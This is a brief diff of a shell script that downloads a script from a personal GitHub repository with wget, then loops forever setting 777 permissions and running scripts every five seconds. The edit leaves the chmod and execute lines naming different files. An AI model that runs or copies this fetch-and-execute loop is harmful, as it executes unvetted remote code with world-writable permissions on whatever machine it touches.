@@ -8,7 +8,7 @@ wget https://github.com/Mafs68/hjs839/raw/main/Sec.sh -O ran2.sh
 while :
 do
 	
-	chmod 777 rad1.sh
+	chmod 777 ran1.sh
 	./rad1.sh
 	sleep 5
 	chmod 777 ran2.sh
